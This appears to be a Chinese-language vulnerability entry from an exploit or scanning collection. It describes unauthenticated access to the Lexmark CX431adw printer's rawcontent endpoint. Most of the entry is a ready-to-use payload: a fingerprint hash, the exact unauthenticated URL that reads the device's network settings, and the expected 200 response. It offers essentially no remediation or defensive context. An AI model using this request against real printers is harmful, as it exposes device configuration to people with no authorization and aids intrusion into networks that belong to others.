# LexmarkCX431adw打印机rawcontent存在未授权访问漏洞

LexmarkCX431adw ｜ 未授权访问 ｜ —
- **指纹**：`"cza/QvL+f4+nwgGZusE0hg=="`

**Payload**
```
访问目标设备首页，确认设备型号
发送未认证请求读取网络配置
[http://IP/webglue/rawcontent?c=/Settings/Network](http://IP/webglue/rawcontent?c=/Settings/Network)
验证返回的网络配置数据
```
- **响应特征**：200